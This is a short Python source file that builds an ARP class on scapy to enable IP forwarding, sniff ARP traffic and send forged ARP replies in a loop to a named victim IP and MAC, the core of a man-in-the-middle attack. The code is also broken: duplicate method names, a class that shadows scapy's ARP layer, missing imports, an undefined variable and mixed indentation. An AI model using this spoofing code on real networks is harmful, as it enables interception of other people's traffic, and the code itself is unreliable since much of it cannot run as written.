import sys, scapy, time, os, socket
from scapy import *
class ARP:

	def enable_forwarding(self):
		os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

	#count is how many packets to count
	#filename is assumed to be valid
	#returns 1 when done
	def arp_monitor(self, filename, count):
		pkts =sniff(filter="arp", count=count)
		wrpcap(filename,pkts)
		return 1;

    #doesn't store anythng
	def arp_monitor(self):
		sniff(prn=arp_monitor_callback,filter="arp",store=0)

	def arp_monitor_callback(self, pkt):
		if ARP in pkt and pkt[ARP].op in(1,2):
			return pkt.sprintf("%ARP.hwsrc% %ARP.psrc%")

	def arp_spoof(self,victimIp,victimMac, srcIp, srcMac,iface):
		pkt = Ether()/ARP()
		pkt.pdst = victimIp
		pkt.hwdst = victimMac
		pkt.src = srcIp
		pkt.srcMac = srcMac
		sendp(pkt,iface=iface, loop = 1)
	def arp_spoof(self, victimIp, victimMac, iface):
		pkt = Ether()/ARP()
		pkt.pdst=victimIp
		pkt.hwdst=victimMac
		pkt.src= socket.gethostbyname(socket.gethostname())
		pkt.hwsrc = get_host_mac()
		sendp(pkt,iface=iface, loop = 1)
	def get_host_mac(self):
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	    info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', nicname[:15]))
	    return ':'.join(['%02x' % ord(char) for char in info[18:24]])

#calls function arp_monitor_callback
	def __init__ (self):
		enable_forwarding(self)
